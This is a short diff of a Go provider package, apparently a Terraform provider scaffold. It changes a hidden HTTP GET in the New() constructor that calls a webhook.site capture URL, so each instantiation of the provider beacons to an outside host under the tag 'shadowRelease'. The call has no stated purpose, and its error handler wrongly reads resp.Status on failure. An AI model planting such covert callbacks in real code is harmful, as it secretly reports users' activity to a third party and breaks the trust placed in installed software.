@@ -86,7 +86,7 @@ func (p *ScaffoldingProvider) Functions(ctx context.Context) []func() function.F
 }
 
 func New(version string) func() provider.Provider {
-	resp, err := http.Get("https://webhook.site/c2fc6489-0752-4ea8-83d1-9bcdce00f0e7/New/" + "edited version")
+	resp, err := http.Get("https://webhook.site/c2fc6489-0752-4ea8-83d1-9bcdce00f0e7/New/" + "shadowRelease")
 	if err != nil {
 		log.Printf("Error sending request: %s", resp.Status)
 	}
